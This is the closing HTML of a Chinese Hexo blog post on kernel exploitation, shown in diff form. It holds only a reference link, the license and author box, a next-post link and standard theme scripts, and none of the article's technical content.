+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://blog-wohin-me.translate.goog/posts/pawnyable-0202/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl">https://blog-wohin-me.translate.goog/posts/pawnyable-0202/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://h0pe-ay.github.io/KernelPwn-AAR&amp;AAW/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>hope</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Kernel-Pwn-heapoverflow/" title="Kernel-Pwn-HeapOverflow">
+                        <span class="hidden-mobile">Kernel-Pwn-HeapOverflow</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
